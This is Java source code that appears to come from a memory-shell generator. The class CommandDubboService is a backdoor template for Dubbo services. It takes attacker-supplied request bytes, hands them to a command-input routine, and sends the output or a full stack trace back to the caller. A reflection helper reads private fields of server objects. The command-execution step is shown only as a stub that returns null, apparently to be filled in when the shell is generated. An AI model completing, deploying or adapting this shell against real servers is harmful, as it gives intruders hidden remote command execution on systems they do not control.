package com.reajason.javaweb.memshell.shelltool.command;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.util.Scanner;

public class CommandDubboService {

    public byte[] handle(byte[] bytes) {
        if (bytes == null || bytes.length == 0) {
            return new byte[0];
        }
        String p = new String(bytes);
        String param = getParam(p);
        try {
            InputStream inputStream = getInputStream(param);
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            outputStream.write(new Scanner(inputStream).useDelimiter("\\A").next().getBytes());
            outputStream.flush();
            outputStream.close();
            return outputStream.toByteArray();
        } catch (Exception e) {
            return getErrorMessage(e).getBytes();
        }
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }

    @SuppressWarnings("all")
    public Object unwrap(Object obj, String fieldName) {
        try {
            return getFieldValue(obj, fieldName);
        } catch (Throwable e) {
            return obj;
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
